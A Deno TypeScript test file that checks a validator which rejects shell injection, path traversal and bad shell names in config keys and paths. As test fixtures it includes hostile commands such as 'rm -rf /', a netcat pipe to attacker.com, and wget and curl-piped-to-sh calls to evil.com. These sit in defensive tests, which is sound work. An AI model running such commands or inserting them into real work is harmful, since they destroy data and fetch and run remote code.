// SPDX-License-Identifier: PMPL-1.0-or-later
// tests/aspect/security_test.ts - Security and injection attack tests
//
// Tests protection against shell injection, path traversal, and other security issues.

import {
  assertEquals,
  assertThrows,
} from "https://deno.land/std@0.208.0/assert/mod.ts";

// ============================================================================
// Security Test Contracts
// ============================================================================

/**
 * Security validator for shell paths.
 */
class SecurityValidator {
  /**
   * Validate shell path against injection attacks.
   * Rejects:
   * - Semicolons (command separator)
   * - Backticks (command substitution)
   * - Dollar signs with parentheses (command substitution)
   * - Pipes (pipeline)
   * - Ampersands (background/logical operators)
   * - Redirects (>, <)
   * - Parentheses and braces
   */
  static validateShellPath(path: string): boolean {
    const dangerousChars = [";", "`", "$", "|", "&", "(", ")", "{", "}", ">", "<"];
    return !dangerousChars.some((char) => path.includes(char));
  }

  /**
   * Validate configuration key against injection.
   * Rejects:
   * - Equals signs (variable assignment)
   * - Semicolons (command separator)
   * - Dollar signs (variable expansion)
   * - Backticks (command substitution)
   * - Pipes and ampersands (operators)
   */
  static validateConfigKey(key: string): boolean {
    const dangerousChars = ["=", ";", "$", "`", "|", "&", "(", ")"];
    return !dangerousChars.some((char) => key.includes(char));
  }

  /**
   * Validate configuration value against injection.
   * Rejects:
   * - Null bytes (can terminate strings in C code)
   * - Control characters that might cause issues
   */
  static validateConfigValue(value: string): boolean {
    // Reject null bytes
    if (value.includes("\0")) return false;

    // Reject other control characters except newlines and tabs
    for (const char of value) {
      const code = char.charCodeAt(0);
      if (code < 32 && code !== 9 && code !== 10) {
        return false;
      }
    }

    return true;
  }

  /**
   * Validate shell path doesn't contain path traversal.
   * Rejects:
   * - ".." sequences
   * - Relative paths starting with "./"
   * - Encoded traversal like "%2e%2e"
   */
  static validateNoPathTraversal(path: string): boolean {
    // Reject ".."
    if (path.includes("..")) return false;

    // Reject "./"
    if (path.startsWith("./")) return false;

    // Reject encoded forms
    if (path.includes("%2e") || path.includes("%2f")) return false;

    // Reject encoded variations
    if (path.toLowerCase().includes("%2e%2e")) return false;

    return true;
  }

  /**
   * Validate shell name doesn't contain special characters.
   * Only alphanumeric and underscore allowed.
   */
  static validateShellName(name: string): boolean {
    return /^[a-z0-9_]+$/.test(name);
  }
}

// ============================================================================
// Security Tests
// ============================================================================

// ---- Shell Path Injection Tests ----

Deno.test("Security: Reject shell path with semicolon injection", () => {
  const malicious = "bash; rm -rf /";
  assertEquals(SecurityValidator.validateShellPath(malicious), false);
});

Deno.test("Security: Reject shell path with backtick substitution", () => {
  const malicious = "bash`whoami`";
  assertEquals(SecurityValidator.validateShellPath(malicious), false);
});

Deno.test("Security: Reject shell path with dollar paren substitution", () => {
  const malicious = "/bin/bash$(rm -rf /)";
  assertEquals(SecurityValidator.validateShellPath(malicious), false);
});

Deno.test("Security: Reject shell path with pipe injection", () => {
  const malicious = "bash | nc attacker.com 1234";
  assertEquals(SecurityValidator.validateShellPath(malicious), false);
});

Deno.test("Security: Reject shell path with && logical operator", () => {
  const malicious = "bash && evil_command";
  assertEquals(SecurityValidator.validateShellPath(malicious), false);
});

Deno.test("Security: Reject shell path with || logical operator", () => {
  const malicious = "bash || evil_command";
  assertEquals(SecurityValidator.validateShellPath(malicious), false);
});

Deno.test("Security: Reject shell path with background operator", () => {
  const malicious = "/bin/bash & malicious_code";
  assertEquals(SecurityValidator.validateShellPath(malicious), false);
});

Deno.test("Security: Accept valid absolute shell path", () => {
  assertEquals(SecurityValidator.validateShellPath("/bin/bash"), true);
  assertEquals(SecurityValidator.validateShellPath("/usr/bin/zsh"), true);
  assertEquals(SecurityValidator.validateShellPath("/usr/local/bin/fish"), true);
});

Deno.test("Security: Accept valid shell name as path", () => {
  assertEquals(SecurityValidator.validateShellPath("bash"), true);
  assertEquals(SecurityValidator.validateShellPath("zsh"), true);
  assertEquals(SecurityValidator.validateShellPath("fish"), true);
});

// ---- Configuration Key Injection Tests ----

Deno.test("Security: Reject config key with equals sign", () => {
  const malicious = "SHELL=bash";
  assertEquals(SecurityValidator.validateConfigKey(malicious), false);
});

Deno.test("Security: Reject config key with semicolon", () => {
  const malicious = "KEY;other=value";
  assertEquals(SecurityValidator.validateConfigKey(malicious), false);
});

Deno.test("Security: Reject config key with dollar expansion", () => {
  const malicious = "KEY$USER";
  assertEquals(SecurityValidator.validateConfigKey(malicious), false);
});

Deno.test("Security: Reject config key with backtick substitution", () => {
  const malicious = "KEY`id`";
  assertEquals(SecurityValidator.validateConfigKey(malicious), false);
});

Deno.test("Security: Reject config key with command substitution", () => {
  const malicious = "KEY$(whoami)";
  assertEquals(SecurityValidator.validateConfigKey(malicious), false);
});

Deno.test("Security: Reject config key with pipe", () => {
  const malicious = "KEY|other";
  assertEquals(SecurityValidator.validateConfigKey(malicious), false);
});

Deno.test("Security: Accept valid config keys", () => {
  assertEquals(SecurityValidator.validateConfigKey("SHELL"), true);
  assertEquals(SecurityValidator.validateConfigKey("EDITOR"), true);
  assertEquals(SecurityValidator.validateConfigKey("MY_VAR"), true);
  assertEquals(SecurityValidator.validateConfigKey("key123"), true);
});

// ---- Configuration Value Injection Tests ----

Deno.test("Security: Reject config value with null byte", () => {
  const malicious = "value\0more";
  assertEquals(SecurityValidator.validateConfigValue(malicious), false);
});

Deno.test("Security: Reject config value starting with null byte", () => {
  const malicious = "\0";
  assertEquals(SecurityValidator.validateConfigValue(malicious), false);
});

Deno.test("Security: Reject config value with control characters", () => {
  const malicious = "value\x01\x02\x03";
  assertEquals(SecurityValidator.validateConfigValue(malicious), false);
});

Deno.test("Security: Accept config value with newlines and tabs", () => {
  assertEquals(SecurityValidator.validateConfigValue("line1\nline2"), true);
  assertEquals(SecurityValidator.validateConfigValue("tab\tseparated"), true);
});

Deno.test("Security: Accept config value with shell metacharacters (not dangerous in values)", () => {
  // Values can contain these safely if properly quoted in shell
  assertEquals(SecurityValidator.validateConfigValue("value;with;semicolons"), true);
  assertEquals(SecurityValidator.validateConfigValue("value|with|pipes"), true);
  assertEquals(SecurityValidator.validateConfigValue("/path/to/file"), true);
});

// ---- Path Traversal Tests ----

Deno.test("Security: Reject path with parent directory reference", () => {
  assertEquals(SecurityValidator.validateNoPathTraversal("../etc/passwd"), false);
  assertEquals(SecurityValidator.validateNoPathTraversal("../../etc/passwd"), false);
  assertEquals(SecurityValidator.validateNoPathTraversal("/usr/bin/../../etc/passwd"), false);
});

Deno.test("Security: Reject path starting with ./", () => {
  assertEquals(SecurityValidator.validateNoPathTraversal("./bash"), false);
  assertEquals(SecurityValidator.validateNoPathTraversal("./../../passwd"), false);
});

Deno.test("Security: Reject path with encoded parent references", () => {
  assertEquals(SecurityValidator.validateNoPathTraversal("..%2f..%2fetc%2fpasswd"), false);
  assertEquals(SecurityValidator.validateNoPathTraversal("%2e%2e%2fpasswd"), false);
});

Deno.test("Security: Accept valid absolute paths", () => {
  assertEquals(SecurityValidator.validateNoPathTraversal("/bin/bash"), true);
  assertEquals(SecurityValidator.validateNoPathTraversal("/usr/bin/zsh"), true);
  assertEquals(SecurityValidator.validateNoPathTraversal("/usr/local/bin/fish"), true);
});

Deno.test("Security: Accept valid shell names", () => {
  assertEquals(SecurityValidator.validateNoPathTraversal("bash"), true);
  assertEquals(SecurityValidator.validateNoPathTraversal("zsh"), true);
  assertEquals(SecurityValidator.validateNoPathTraversal("fish"), true);
});

// ---- Shell Name Validation Tests ----

Deno.test("Security: Reject shell name with special characters", () => {
  assertEquals(SecurityValidator.validateShellName("bash-evil"), false);
  assertEquals(SecurityValidator.validateShellName("bash.evil"), false);
  assertEquals(SecurityValidator.validateShellName("bash@evil"), false);
  assertEquals(SecurityValidator.validateShellName("bash$evil"), false);
});

Deno.test("Security: Reject shell name with uppercase", () => {
  assertEquals(SecurityValidator.validateShellName("Bash"), false);
  assertEquals(SecurityValidator.validateShellName("BASH"), false);
  assertEquals(SecurityValidator.validateShellName("BaSh"), false);
});

Deno.test("Security: Accept valid shell names", () => {
  assertEquals(SecurityValidator.validateShellName("bash"), true);
  assertEquals(SecurityValidator.validateShellName("zsh"), true);
  assertEquals(SecurityValidator.validateShellName("fish"), true);
  assertEquals(SecurityValidator.validateShellName("dash"), true);
  assertEquals(SecurityValidator.validateShellName("ksh"), true);
  assertEquals(SecurityValidator.validateShellName("custom_shell"), true);
});

// ---- Comprehensive Injection Test Suite ----

Deno.test("Security: Comprehensive shell path injection attacks", () => {
  const attacks = [
    "bash; cat /etc/passwd",
    "bash | nc attacker.com",
    "bash && wget http://evil.com/malware",
    "/bin/bash $(curl http://evil.com/code.sh | sh)",
    "/bin/bash`curl http://evil.com/code.sh`",
    "/bin/bash > /tmp/log",
    "/bin/bash < /etc/passwd",
  ];

  for (const attack of attacks) {
    assertEquals(
      SecurityValidator.validateShellPath(attack),
      false,
      `Should reject injection: ${attack}`
    );
  }
});

Deno.test("Security: Comprehensive config key injection attacks", () => {
  const attacks = [
    "SHELL=bash",
    "KEY;rm=/rf /",
    "KEY$(whoami)",
    "KEY`id`",
    "KEY|cat",
    "KEY&background",
  ];

  for (const attack of attacks) {
    assertEquals(
      SecurityValidator.validateConfigKey(attack),
      false,
      `Should reject injection: ${attack}`
    );
  }
});
